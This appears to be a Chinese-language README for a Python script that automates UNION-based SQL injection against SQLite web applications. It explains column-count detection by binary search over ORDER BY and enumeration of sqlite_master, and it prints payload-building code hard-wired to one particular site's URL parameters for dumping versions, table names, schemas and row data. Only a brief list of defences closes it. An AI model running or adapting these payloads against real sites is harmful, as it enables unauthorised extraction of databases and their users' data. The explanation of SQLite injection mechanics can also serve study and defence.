
Sqlite联合注入辅助脚本

0×01概述：

SQLite是一款轻型的数据库。sqlite存在一个叫SQLITE_MASTER的表，这与MySQL5.x的INFORMATION_SCHEMA表类似。sqlite_master 表中保存了数据库中所有表的信息，该表中比较有用的字段有“name,sql”，name字段存放的是表名，sql字段存放的是表结构。可以通过内置函数sqlite_version()获取版本信息，和其他数据库一样，通过“order by”判断长度，该数据库的注释符和ORACLE数据库一样，都是--。

0×02使用参数：
  
  python sqlite.py -u url --tables＃获取所有表名
  
  python sqlite.py -u url --columns＃获取所有表结构，从而获取字段值
  
  python sqlite.py -u url -T table_name -C column_name -d＃获取指定字段内容

0×03：信息获取

通过自定义函数SetPoc，根据功能需求，设置各发包的PoC，比如猜测“order by”长度，获取版本信息，获取表名，获取表中字段名，以及字段的具体内容。
首先判断注入类型，是整型（123和555 = 555--），字符型（123'和555 = 555--），还是搜索型（123％'和555 = 555--），再通过二分法判断“order by”长度，如果一开始插入order by mid（尝试的长度）的包返回状态和正常的原始包返回状态不相等，则说明mid过大，如果原始正常包返回状态与插入的order by mid和order by mid + 1的包返回状态相等，则说明mid过小，如果原始正常包返回状态与插入order by mid的返回包状态相等，但与order by mid + 1的包返回状态不相等，则成功获取order by长度。

def SetPoc(self, action):

        # 获取order by 数目的poc
        if action == "orderby":
            poc0 = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同" \
                   "&q=&pageIndex=1&searchname=&_=1522659952172"
            poc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') "
            poc_end = "--&q=&pageIndex=1&searchname=&_=1522659952172"
            response0 = SendData(target, poc0)
            min = 0
            max = self.OrderBy
            middle = (max+min) / 2
            while self.OrderBy > 0:
                ordpoc1 = (poc_start + "order by {0}" + poc_end).format(middle)
                ordpoc2 = (poc_start + "order by {0}" + poc_end).format(middle + 1)
                response1 = SendData(target, ordpoc1)
                response2 = SendData(target, ordpoc2)
                if response0.status_code != response1.status_code:
                    max = middle
                    middle = (min+max) / 2
                else:
                    if response1.status_code == response2.status_code:
                        
                        if response1.status_code == 200:
                            min = middle
                            middle = (min+max) / 2
                        else:
                            max = middle
                            middle = (min+max) / 2
                    else:
                        self.OrderBy = middle
                        print ("》Order By number is %s" % self.OrderBy)
                        break   


通过调用count(1)可获取数据库中表的总数，通过查询系统表SQLITE_MASTER中的name字段，可获取数据库中所有表名，这和MySQL数据库中系统表INFORMATION_SCHEMA中的“table_name”字段类似。通过limit关键字指定获取信息的开始位置和数量，比如limit 0,1，则是从第一条开始，并且只获取一条数据

        # 获取表数量的poc
        elif action == "tabnum":
            tabnumpoc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') " \
                          "and 1=2 UNION SELECT null,'<xxoo>'||count(1)||'</xxoo>'"
            tabnumpoc_end = " from sqlite_master--&q=&pageIndex=1&searchname=&_=1522659952172"
            tabnumpoc = tabnumpoc_start + self.poc_mid + tabnumpoc_end
            return tabnumpoc


通过上步获取的order by长度，再调用内置函数sqlite_version()，获取版本信息，poc类似％'  and 1 = 2 UNION SELECT null,sqlite_version() ，Sqlite数据库的字符型、搜索类型注入，和Oracle数据库一样，可以通过使用null进行注入。这里将发送包分成三部分进行拼接，第一部分是类似123％' and 1 = 2 union select null,sqlite_vetsion()，这部分将根据要查询的信息进行变化，如查询所有表名，则使用123％' and 1 = 2 union select null,name；第二部分则根据前面获取的order by 长度，补齐缺少的null，第三部分则根据要查询条件进行修改

        # 获取版本信息的poc
        elif action == "version":
            verpoc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') " \
                           "and 1=2 UNION SELECT null,'<xxoo>'||sqlite_version()||'</xxoo>'"
            verpoc_end = " from sqlite_master--&q=&pageIndex=1&searchname=&_=1522659952172"
            order_num = self.OrderBy
            while order_num > 2:
                self.poc_mid = self.poc_mid + ",null"
                order_num = order_num - 1
            verpoc = verpoc_start + self.poc_mid + verpoc_end
            #print self.poc_mid
            return verpoc
            
            
![image](https://github.com/silience/sql/blob/master/image/tables.png)

sqlite_master表和mysql数据库中系统表information_schema不一样的是，sqlite_master不存在类似“column_name”的字段，但是她有一个sql字段，该字段保存了各个表的结构，包括表名，字段名和类型。因此可以通过查询sql字段获取各个表的列名。

        # 获取所有表结构的poc
        elif action == "columns":
            columnspoc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') " \
                   "and 1=2 UNION SELECT null,'<xxoo>'||sql||'</xxoo>'"
            columnspoc_end = " from sqlite_master limit 0,{0}--&q=&pageIndex=1&searchname=&_=1522659952172".format(self.table_num)
            columnspoc = columnspoc_start + self.poc_mid + columnspoc_end
            return columnspoc
            
![image](https://github.com/silience/sql/blob/master/image/columns.png)

通过前面获取的表名和列名，再获取具体内容，类似的poc为123％' and 1 = 2 UNION SELECT null,column_name,null from table_name--。

        # 获取指定表数据条数的poc
        elif action == "datanum":
            datanumpoc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') " \
                   "and 1=2 UNION SELECT null,'<xxoo>'||count(1)||'</xxoo>'"
            datanumpoc_end = " from {0}--&q=&pageIndex=1&searchname=&_=1522659952172".format(table_name)
            datanumpoc = datanumpoc_start + self.poc_mid + datanumpoc_end
            return datanumpoc

        # 获取具体数据的poc
        elif action == "data":
            datapoc_start = "?callback=jQuery21005291906092260772_1522659952161&mainQ=四同%') " \
                "and 1=2 UNION SELECT null,'<xxoo>'||{0}||'</xxoo>'".format(column_name)
            datapoc_end = " from {0} limit 0,{1}--&q=&pageIndex=1&searchname=&_=1522659952172".format(table_name, self.column_num)
            datapoc = datapoc_start + self.poc_mid + datapoc_end
            return datapoc
            
![image](https://github.com/silience/sql/blob/master/image/data.png)

0×04：SQL注入防御

1，使用白名单或者黑名单进行全局过滤，防止二次注入

2，强制使用预编译，参数化语句，如JSP的PreparedStatement的setString方法等

3，前端JS过滤，如调用escape方法

4，借助第三方安全防御软件，如WAF
